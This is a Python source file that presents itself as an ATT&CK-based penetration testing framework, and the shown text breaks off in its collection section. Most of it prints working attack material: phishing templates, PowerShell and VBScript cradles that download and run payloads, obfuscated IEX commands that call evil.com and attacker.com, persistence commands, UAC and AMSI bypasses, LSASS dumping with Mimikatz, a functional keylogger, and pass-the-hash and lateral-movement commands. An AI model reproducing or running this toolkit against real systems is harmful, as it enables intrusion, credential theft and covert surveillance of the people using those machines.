#!/usr/bin/env python3

import argparse
import socket
import subprocess
import sys
import os
import nmap
import requests
import whois
import dns.resolver
import datetime
import json
import re
import base64
import random
import string
import platform
import time
import zipfile
import shutil
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Initialize colorama
init()

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗ ║
    ║   ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝ ║
    ║   ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗ ║
    ║   ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║ ║
    ║   ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║ ║
    ║   ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝ ║
    ║                                                       ║
    ║   Advanced Penetration Testing Framework              ║
    ║   Based on MITRE ATT&CK Framework                     ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

def check_root():
    if os.name == 'posix' and os.geteuid() != 0:
        print(Fore.RED + "[!] This script requires root privileges to run properly." + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] Try running with sudo." + Style.RESET_ALL)
        sys.exit(1)
    elif os.name == 'nt':
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(Fore.YELLOW + "[*] It's recommended to run this script with administrator privileges." + Style.RESET_ALL)

# 1. Initial Access
def initial_access(target, port):
    print(Fore.GREEN + f"[*] Simulating Initial Access techniques for {target}" + Style.RESET_ALL)
    
    try:
        # Phishing simulation
        print(Fore.YELLOW + "\n[+] Phishing Email Template Generator:" + Style.RESET_ALL)
        phishing_templates = [
            {
                "subject": "Urgent: Your Account Requires Immediate Attention",
                "body": f"Dear User,\n\nWe have detected unusual activity on your account. Please verify your credentials at http://{target}:{port}/login.php\n\nRegards,\nIT Security Team"
            },
            {
                "subject": "Invoice Payment Notification",
                "body": f"Please review the attached invoice and confirm payment details at http://{target}:{port}/invoice.php\n\nAccounting Department"
            },
            {
                "subject": "Security Alert: Password Reset Required",
                "body": f"Your password will expire in 24 hours. Please reset it immediately at http://{target}:{port}/reset.php\n\nIT Department"
            }
        ]
        
        for i, template in enumerate(phishing_templates, 1):
            print(Fore.GREEN + f"    Template #{i}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Subject: {template['subject']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Body: {template['body']}" + Style.RESET_ALL)
            print()
        
        # Vulnerable service scanner
        print(Fore.YELLOW + "\n[+] Scanning for Vulnerable Services:" + Style.RESET_ALL)
        nm = nmap.PortScanner()
        nm.scan(target, arguments='-p 21,22,23,25,80,443,445,3389,8080 -sV')
        
        vulnerable_services = {
            'ftp-21': 'Anonymous FTP Login',
            'telnet-23': 'Cleartext Protocol',
            'smb-445': 'SMB Protocol Vulnerabilities',
            'rdp-3389': 'RDP Vulnerabilities'
        }
        
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = sorted(nm[host][proto].keys())
                for port in ports:
                    service = nm[host][proto][port]
                    service_name = service['name']
                    
                    # Check for potentially vulnerable services
                    for vuln_service, description in vulnerable_services.items():
                        service_type, port_check = vuln_service.split('-')
                        if service_type in service_name or port == int(port_check):
                            print(Fore.RED + f"    [!] Potentially Vulnerable: {service_name} on port {port}" + Style.RESET_ALL)
                            print(Fore.RED + f"    [!] Description: {description}" + Style.RESET_ALL)
                            print(Fore.RED + f"    [!] Version: {service.get('product', 'Unknown')} {service.get('version', '')}" + Style.RESET_ALL)
        
        # Check for default credentials
        print(Fore.YELLOW + "\n[+] Default Credential Checker:" + Style.RESET_ALL)
        default_creds = [
            {"service": "Web", "username": "admin", "password": "admin"},
            {"service": "Web", "username": "admin", "password": "password"},
            {"service": "FTP", "username": "anonymous", "password": "anonymous"},
            {"service": "Database", "username": "sa", "password": "sa"},
            {"service": "Router", "username": "admin", "password": "admin1234"}
        ]
        
        for cred in default_creds:
            print(Fore.GREEN + f"    Service: {cred['service']}, Username: {cred['username']}, Password: {cred['password']}" + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during initial access simulation: {e}" + Style.RESET_ALL)

# 2. Execution
def execution(target, port):
    print(Fore.GREEN + f"[*] Simulating Execution techniques for {target}" + Style.RESET_ALL)
    
    try:
        # Command line execution examples
        print(Fore.YELLOW + "\n[+] Command Line Execution Examples:" + Style.RESET_ALL)
        commands = [
            {"name": "PowerShell Download and Execute", "command": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://" + target + ":" + port + "/payload.ps1')\""},
            {"name": "Windows Command Execution", "command": "cmd.exe /c whoami && ipconfig"},
            {"name": "Scheduled Task", "command": "schtasks /create /tn \"UpdateCheck\" /tr \"powershell.exe -WindowStyle hidden -file C:\\update.ps1\" /sc daily /st 09:00"},
            {"name": "WMI Execution", "command": "wmic process call create \"cmd.exe /c calc.exe\""}
        ]
        
        for cmd in commands:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # Script execution examples
        print(Fore.YELLOW + "\n[+] Script Execution Examples:" + Style.RESET_ALL)
        
        # PowerShell script example
        ps_script = """
$url = "http://{0}:{1}/payload.exe"
$outpath = "$env:TEMP\\update.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $outpath)
Start-Process -FilePath $outpath
        """.format(target, port)
        
        # VBScript example
        vbs_script = """
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://{0}:{1}/payload.exe", false
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
  Set objADOStream = CreateObject("ADODB.Stream")
  objADOStream.Open
  objADOStream.Type = 1
  objADOStream.Write objXMLHTTP.ResponseBody
  objADOStream.Position = 0
  objADOStream.SaveToFile "%TEMP%\\update.exe", 2
  objADOStream.Close
  Set objADOStream = Nothing
End If

Set objXMLHTTP = Nothing
Set objShell = CreateObject("WScript.Shell")
objShell.Run "%TEMP%\\update.exe", 0, False
Set objShell = Nothing
        """.format(target, port)
        
        print(Fore.GREEN + "    PowerShell Script:" + Style.RESET_ALL)
        print(Fore.GREEN + ps_script + Style.RESET_ALL)
        print()
        
        print(Fore.GREEN + "    VBScript:" + Style.RESET_ALL)
        print(Fore.GREEN + vbs_script + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during execution simulation: {e}" + Style.RESET_ALL)

# 3. Persistence
def persistence(target):
    print(Fore.GREEN + f"[*] Simulating Persistence techniques for {target}" + Style.RESET_ALL)
    
    try:
        # Registry persistence examples
        print(Fore.YELLOW + "\n[+] Registry Persistence Examples:" + Style.RESET_ALL)
        registry_keys = [
            {"location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "key": "UpdateCheck", "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -file C:\\update.ps1"},
            {"location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "key": "SecurityUpdate", "value": "C:\\Windows\\System32\\cmd.exe /c C:\\update.bat"},
            {"location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "key": "Startup", "value": "C:\\Users\\Public\\Documents\\Startup"}
        ]
        
        for reg in registry_keys:
            print(Fore.GREEN + f"    Location: {reg['location']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Key: {reg['key']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Value: {reg['value']}" + Style.RESET_ALL)
            print()
        
        # Scheduled task persistence
        print(Fore.YELLOW + "\n[+] Scheduled Task Persistence:" + Style.RESET_ALL)
        scheduled_tasks = [
            {"name": "Daily Update", "command": "schtasks /create /tn \"DailyUpdate\" /tr \"powershell.exe -WindowStyle hidden -file C:\\update.ps1\" /sc daily /st 09:00"},
            {"name": "System Check", "command": "schtasks /create /tn \"SystemCheck\" /tr \"C:\\Windows\\System32\\cmd.exe /c C:\\check.bat\" /sc onlogon"},
            {"name": "Hourly Connection", "command": "schtasks /create /tn \"NetworkCheck\" /tr \"powershell.exe -WindowStyle hidden -Command \\\"& {Invoke-WebRequest -Uri 'http://" + target + "/check.php'}\\\"\" /sc hourly"}
        ]
        
        for task in scheduled_tasks:
            print(Fore.GREEN + f"    Name: {task['name']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Command: {task['command']}" + Style.RESET_ALL)
            print()
        
        # Startup folder persistence
        print(Fore.YELLOW + "\n[+] Startup Folder Persistence:" + Style.RESET_ALL)
        startup_locations = [
            {"location": "C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", "file": "update.lnk"},
            {"location": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", "file": "system.bat"}
        ]
        
        for loc in startup_locations:
            print(Fore.GREEN + f"    Location: {loc['location']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    File: {loc['file']}" + Style.RESET_ALL)
            print()
        
        # WMI persistence
        print(Fore.YELLOW + "\n[+] WMI Event Subscription Persistence:" + Style.RESET_ALL)
        wmi_command = """
wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="UpdateFilter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

wmic /namespace:"\\\\root\\subscription" path CommandLineEventConsumer create Name="UpdateConsumer", ExecutablePath="C:\\Windows\\System32\\cmd.exe", CommandLineTemplate="/c C:\\update.bat"

wmic /namespace:"\\\\root\\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\\"UpdateFilter\\"", Consumer="CommandLineEventConsumer.Name=\\"UpdateConsumer\\""
        """
        print(Fore.GREEN + wmi_command + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during persistence simulation: {e}" + Style.RESET_ALL)

# 4. Privilege Escalation
def privilege_escalation(target):
    print(Fore.GREEN + f"[*] Simulating Privilege Escalation techniques for {target}" + Style.RESET_ALL)
    
    try:
        # UAC bypass examples
        print(Fore.YELLOW + "\n[+] UAC Bypass Techniques:" + Style.RESET_ALL)
        uac_bypasses = [
            {"name": "Fodhelper Registry Method", "description": "Uses fodhelper.exe to bypass UAC through registry manipulation", 
             "command": """
REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f
REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "" /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden
             """},
            {"name": "Eventvwr Registry Method", "description": "Uses eventvwr.exe to bypass UAC through registry manipulation",
             "command": """
REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /v "" /t REG_SZ /d "cmd.exe /c start cmd.exe" /f
Start-Process "C:\\Windows\\System32\\eventvwr.exe" -WindowStyle Hidden
             """}
        ]
        
        for bypass in uac_bypasses:
            print(Fore.GREEN + f"    Name: {bypass['name']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Description: {bypass['description']}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    Command:\n{bypass['command']}" + Style.RESET_ALL)
            print()
        
        # Service misconfiguration check
        print(Fore.YELLOW + "\n[+] Service Misconfiguration Check:" + Style.RESET_ALL)
        service_check_cmd = """
# PowerShell script to check for service misconfigurations
$services = Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -like "*LocalSystem*" -and $_.PathName -match "Program Files" -and (Test-Path ($_.PathName -replace '"','') -ErrorAction SilentlyContinue)}
$services | ForEach-Object {
    $path = $_.PathName -replace '"',''
    $acl = Get-Acl $path -ErrorAction SilentlyContinue
    if ($acl.Access | Where-Object {$_.IdentityReference -match "Users" -and $_.FileSystemRights -match "Modify|FullControl|Write"}) {
        Write-Output "Vulnerable Service Found: $($_.Name)"
        Write-Output "Path: $path"
        Write-Output "Current Permissions allow modification by non-admin users"
    }
}
        """
        print(Fore.GREEN + service_check_cmd + Style.RESET_ALL)
        
        # Unquoted service path check
        print(Fore.YELLOW + "\n[+] Unquoted Service Path Check:" + Style.RESET_ALL)
        unquoted_path_cmd = """
# PowerShell script to check for unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch '^".*"$' -and $_.PathName -match ' '} | Select-Object Name, DisplayName, PathName
        """
        print(Fore.GREEN + unquoted_path_cmd + Style.RESET_ALL)
        
        # DLL hijacking check
        print(Fore.YELLOW + "\n[+] DLL Hijacking Check:" + Style.RESET_ALL)
        dll_hijack_cmd = """
# PowerShell script to check for potential DLL hijacking
$env:PATH.Split(';') | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl $_ -ErrorAction SilentlyContinue
        if ($acl.Access | Where-Object {$_.IdentityReference -match "Users|Everyone" -and $_.FileSystemRights -match "Modify|FullControl|Write"}) {
            Write-Output "Potential DLL Hijacking Path: $_"
            Write-Output "Current Permissions allow modification by non-admin users"
        }
    }
}
        """
        print(Fore.GREEN + dll_hijack_cmd + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during privilege escalation simulation: {e}" + Style.RESET_ALL)

# 5. Defense Evasion
def defense_evasion():
    print(Fore.GREEN + "[*] Simulating Defense Evasion techniques" + Style.RESET_ALL)
    
    try:
        # Process injection examples
        print(Fore.YELLOW + "\n[+] Process Injection Techniques:" + Style.RESET_ALL)
        process_injection = """
# PowerShell script for reflective DLL injection (simplified example)
$bytes = (New-Object System.Net.WebClient).DownloadData("http://attacker.com/payload.dll")
$procid = (Get-Process explorer).Id
$baseaddr = [Win32]::VirtualAllocEx($procid, 0, $bytes.Length, 0x3000, 0x40)
[Win32]::WriteProcessMemory($procid, $baseaddr, $bytes, $bytes.Length, [ref]0)
$funcaddr = $baseaddr + 0x1000 # Offset to DllMain
[Win32]::CreateRemoteThread($procid, 0, 0, $funcaddr, 0, 0, 0)
        """
        print(Fore.GREEN + process_injection + Style.RESET_ALL)
        
        # Timestomping examples
        print(Fore.YELLOW + "\n[+] Timestomping Examples:" + Style.RESET_ALL)
        timestomp_cmd = """
# PowerShell script for timestomping
$file = "C:\\Windows\\System32\\calc.exe"
$reference = "C:\\Windows\\System32\\notepad.exe"
$datetime = (Get-Item $reference).LastWriteTime
(Get-Item $file).LastWriteTime = $datetime
(Get-Item $file).LastAccessTime = $datetime
(Get-Item $file).CreationTime = $datetime
        """
        print(Fore.GREEN + timestomp_cmd + Style.RESET_ALL)
        
        # AMSI bypass examples
        print(Fore.YELLOW + "\n[+] AMSI Bypass Techniques:" + Style.RESET_ALL)
        amsi_bypass = """
# PowerShell AMSI bypass (simplified example)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        """
        print(Fore.GREEN + amsi_bypass + Style.RESET_ALL)
        
        # Obfuscation examples
        print(Fore.YELLOW + "\n[+] Command Obfuscation Examples:" + Style.RESET_ALL)
        
        # Original command
        original_cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\""
        
        # Obfuscated versions
        obfuscated_cmds = [
            {"name": "Character Substitution", "command": "p^o^w^e^r^s^h^e^l^l.e^x^e -NoP -Ex Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\""},
            {"name": "Environment Variable Substitution", "command": "%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -Ex Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\""},
            {"name": "Base64 Encoding", "command": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA"}
        ]
        
        print(Fore.GREEN + f"    Original Command: {original_cmd}" + Style.RESET_ALL)
        print()
        
        for cmd in obfuscated_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during defense evasion simulation: {e}" + Style.RESET_ALL)

# 6. Credential Access
def credential_access():
    print(Fore.GREEN + "[*] Simulating Credential Access techniques" + Style.RESET_ALL)
    
    try:
        # Mimikatz commands
        print(Fore.YELLOW + "\n[+] Mimikatz Commands:" + Style.RESET_ALL)
        mimikatz_cmds = [
            {"name": "Dump Credentials", "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""},
            {"name": "Extract from LSASS", "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\""},
            {"name": "Extract Tickets", "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\""},
            {"name": "Pass-the-Hash", "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:contoso.com /ntlm:hash\" \"exit\""}
        ]
        
        for cmd in mimikatz_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # PowerShell credential dumping
        print(Fore.YELLOW + "\n[+] PowerShell Credential Dumping:" + Style.RESET_ALL)
        ps_cred_dump = """
# PowerShell credential dumping (simplified example)
$process = Get-Process lsass
$dumpfile = "$env:TEMP\\lsass.dmp"
$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
$flags = [Reflection.BindingFlags] 'NonPublic, Static'
$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
$processHandle = $process.Handle
$processPid = $process.Id
$dumpFileStream = New-Object IO.FileStream($dumpfile, [IO.FileMode]::Create)
$result = $MiniDumpWriteDump.Invoke($null, @($processHandle, $processPid, $dumpFileStream.SafeFileHandle, 0x00000002, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))
$dumpFileStream.Close()
        """
        print(Fore.GREEN + ps_cred_dump + Style.RESET_ALL)
        
        # Browser credential extraction
        print(Fore.YELLOW + "\n[+] Browser Credential Extraction:" + Style.RESET_ALL)
        browser_cred_cmd = """
# PowerShell script to locate browser credential files (simplified example)
$paths = @{
    "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data";
    "Firefox" = "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\";
    "Edge" = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
}

foreach ($browser in $paths.Keys) {
    if (Test-Path $paths[$browser]) {
        Write-Output "$browser credentials found at: $($paths[$browser])"
    }
}
        """
        print(Fore.GREEN + browser_cred_cmd + Style.RESET_ALL)
        
        # Keylogging example
        print(Fore.YELLOW + "\n[+] Simple PowerShell Keylogger:" + Style.RESET_ALL)
        keylogger_cmd = """
# PowerShell keylogger (simplified example)
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
$GetAsyncKeyState = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

$logFile = "$env:TEMP\\keylog.txt"
$keys = @{}
97..122 | ForEach-Object { $keys[$_] = [char]$_ }
48..57 | ForEach-Object { $keys[$_] = $_ - 48 }
$specialKeys = @{
    8 = "[Backspace]";
    9 = "[Tab]";
    13 = "[Enter]";
    27 = "[Esc]";
    32 = " ";
    46 = "[Delete]"
}
$keys = $keys + $specialKeys

while ($true) {
    Start-Sleep -Milliseconds 40
    for ($i = 8; $i -le 190; $i++) {
        $keyState = $GetAsyncKeyState::GetAsyncKeyState($i)
        if (($keyState -band 0x8000) -eq 0x8000) {
            if ($keys.ContainsKey($i)) {
                $logEntry = $keys[$i]
                Add-Content -Path $logFile -Value $logEntry
            }
        }
    }
}
        """
        print(Fore.GREEN + keylogger_cmd + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during credential access simulation: {e}" + Style.RESET_ALL)

# 7. Discovery
def discovery(target):
    print(Fore.GREEN + f"[*] Simulating Discovery techniques for {target}" + Style.RESET_ALL)
    
    try:
        # Network discovery
        print(Fore.YELLOW + "\n[+] Network Discovery Commands:" + Style.RESET_ALL)
        network_cmds = [
            {"name": "Network Configuration", "command": "ipconfig /all"},
            {"name": "Routing Table", "command": "route print"},
            {"name": "ARP Cache", "command": "arp -a"},
            {"name": "Network Connections", "command": "netstat -ano"},
            {"name": "Network Shares", "command": "net share"},
            {"name": "Network Users", "command": "net user /domain"}
        ]
        
        for cmd in network_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # System discovery
        print(Fore.YELLOW + "\n[+] System Discovery Commands:" + Style.RESET_ALL)
                # System discovery (continued)
        system_cmds = [
            {"name": "System Information", "command": "systeminfo"},
            {"name": "Environment Variables", "command": "set"},
            {"name": "Running Processes", "command": "tasklist /v"},
            {"name": "Services", "command": "sc query"},
            {"name": "Installed Software", "command": "wmic product get name,version"},
            {"name": "Scheduled Tasks", "command": "schtasks /query /fo LIST"}
        ]
        
        for cmd in system_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # Domain discovery
        print(Fore.YELLOW + "\n[+] Domain Discovery Commands:" + Style.RESET_ALL)
        domain_cmds = [
            {"name": "Domain Controllers", "command": "nltest /dclist:domain"},
            {"name": "Domain Admins", "command": "net group \"Domain Admins\" /domain"},
            {"name": "Domain Computers", "command": "net view /domain"},
            {"name": "Domain Trusts", "command": "nltest /domain_trusts"},
            {"name": "Domain Policy", "command": "gpresult /r"}
        ]
        
        for cmd in domain_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # PowerShell discovery script
        print(Fore.YELLOW + "\n[+] PowerShell Discovery Script:" + Style.RESET_ALL)
        ps_discovery = """
# PowerShell discovery script
function Get-SystemInfo {
    $computerSystem = Get-CimInstance CIM_ComputerSystem
    $computerBIOS = Get-CimInstance CIM_BIOSElement
    $computerOS = Get-CimInstance CIM_OperatingSystem
    $computerCPU = Get-CimInstance CIM_Processor
    $computerHDD = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = 'C:'"

    Write-Host "System Information for: " $computerSystem.Name -BackgroundColor Black -ForegroundColor Green
    "Manufacturer: " + $computerSystem.Manufacturer
    "Model: " + $computerSystem.Model
    "Serial Number: " + $computerBIOS.SerialNumber
    "CPU: " + $computerCPU.Name
    "HDD Capacity: " + "{0:N2}" -f ($computerHDD.Size/1GB) + "GB"
    "HDD Space: " + "{0:P2}" -f ($computerHDD.FreeSpace/$computerHDD.Size) + " Free (" + "{0:N2}" -f ($computerHDD.FreeSpace/1GB) + "GB)"
    "RAM: " + "{0:N2}" -f ($computerSystem.TotalPhysicalMemory/1GB) + "GB"
    "Operating System: " + $computerOS.caption + ", Service Pack: " + $computerOS.ServicePackMajorVersion
    "User logged In: " + $computerSystem.UserName
    "Last Reboot: " + $computerOS.LastBootUpTime
}

function Get-NetworkInfo {
    "Network Adapters:"
    Get-NetAdapter | Format-Table Name, InterfaceDescription, Status, LinkSpeed -AutoSize

    "IP Configuration:"
    Get-NetIPConfiguration | Format-Table InterfaceAlias, IPv4Address, IPv6Address -AutoSize

    "Network Connections:"
    Get-NetTCPConnection -State Established | Format-Table LocalAddress, LocalPort, RemoteAddress, RemotePort, State -AutoSize
}

function Get-InstalledSoftware {
    "Installed Software:"
    Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | 
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
    Format-Table -AutoSize
}

function Get-RunningProcesses {
    "Running Processes:"
    Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 20 | 
    Format-Table Name, Id, CPU, PM, WS -AutoSize
}

function Get-LoggedOnUsers {
    "Logged On Users:"
    query user
}

function Get-AdminGroups {
    "Local Administrators:"
    Get-LocalGroupMember -Group "Administrators" | Format-Table Name, PrincipalSource
}

# Run all discovery functions
Get-SystemInfo
Get-NetworkInfo
Get-InstalledSoftware
Get-RunningProcesses
Get-LoggedOnUsers
Get-AdminGroups
        """
        print(Fore.GREEN + ps_discovery + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during discovery simulation: {e}" + Style.RESET_ALL)

# 8. Lateral Movement
def lateral_movement(target):
    print(Fore.GREEN + f"[*] Simulating Lateral Movement techniques for {target}" + Style.RESET_ALL)
    
    try:
        # PsExec examples
        print(Fore.YELLOW + "\n[+] PsExec Examples:" + Style.RESET_ALL)
        psexec_cmds = [
            {"name": "Basic Execution", "command": f"PsExec.exe \\\\{target} -u Administrator -p Password cmd.exe"},
            {"name": "Execute PowerShell", "command": f"PsExec.exe \\\\{target} -u Administrator -p Password powershell.exe -Command \"Get-Process\""},
            {"name": "Copy and Execute", "command": f"PsExec.exe \\\\{target} -u Administrator -p Password -c -f payload.exe"}
        ]
        
        for cmd in psexec_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # WMI examples
        print(Fore.YELLOW + "\n[+] WMI Examples:" + Style.RESET_ALL)
        wmi_cmds = [
            {"name": "Execute Command", "command": f"wmic /node:\"{target}\" /user:Administrator /password:Password process call create \"cmd.exe /c ipconfig > C:\\output.txt\""},
            {"name": "Execute PowerShell", "command": f"wmic /node:\"{target}\" /user:Administrator /password:Password process call create \"powershell.exe -enc BASE64ENCODEDCOMMAND\""}
        ]
        
        for cmd in wmi_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
        # PowerShell Remoting examples
        print(Fore.YELLOW + "\n[+] PowerShell Remoting Examples:" + Style.RESET_ALL)
        ps_remote_cmds = """
# PowerShell Remoting examples
# Enable PowerShell Remoting on target
Enable-PSRemoting -Force

# Create a session
$session = New-PSSession -ComputerName {0} -Credential (Get-Credential)

# Execute commands in the session
Invoke-Command -Session $session -ScriptBlock {{ Get-Process }}

# Copy files using PowerShell Remoting
Copy-Item -Path "C:\\payload.exe" -Destination "C:\\Windows\\Temp\\payload.exe" -ToSession $session

# Execute a script on the remote system
Invoke-Command -Session $session -FilePath "C:\\scripts\\discovery.ps1"

# Create a persistent connection
$session = New-PSSession -ComputerName {0} -Credential (Get-Credential)
Enter-PSSession -Session $session
        """.format(target)
        print(Fore.GREEN + ps_remote_cmds + Style.RESET_ALL)
        
        # Pass-the-Hash examples
        print(Fore.YELLOW + "\n[+] Pass-the-Hash Examples:" + Style.RESET_ALL)
        pth_cmds = [
            {"name": "Mimikatz PTH", "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:contoso.com /ntlm:hash /run:cmd.exe\" \"exit\""},
            {"name": "Impacket PTH", "command": f"python psexec.py -hashes LMHASH:NTHASH Administrator@{target}"}
        ]
        
        for cmd in pth_cmds:
            print(Fore.GREEN + f"    {cmd['name']}:" + Style.RESET_ALL)
            print(Fore.GREEN + f"    {cmd['command']}" + Style.RESET_ALL)
            print()
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during lateral movement simulation: {e}" + Style.RESET_ALL)

# 9. Collection
def collection(target):
    print(Fore.GREEN + f"[*] Simulating Collection techniques for {target}" + Style.RESET_ALL)
    
    try:
        # Data collection examples
        print(Fore.YELLOW + "\n[+] Data Collection Examples:" + Style.RESET_ALL)
        
        # PowerShell data collection script
        ps_collection = """
# PowerShell data collection script
function Get-InterestingFiles {
    param (
        [string[]]$Paths = @("C:\\Users"),
        [string[]]$Extensions = @(".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".ppt", ".pptx", ".config", ".conf", ".ini", ".kdbx", ".key", ".pem", ".cer", ".pfx"),
        [string]$OutputPath = "$env:TEMP\\collected_files"
    )
    
    # Create output directory if it doesn't exist
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath | Out-Null
    }
    
    # Find and copy interesting files
    foreach ($path in $Paths) {
        Write-Host "Searching in $path..." -ForegroundColor Yellow
        foreach ($ext in $Extensions) {
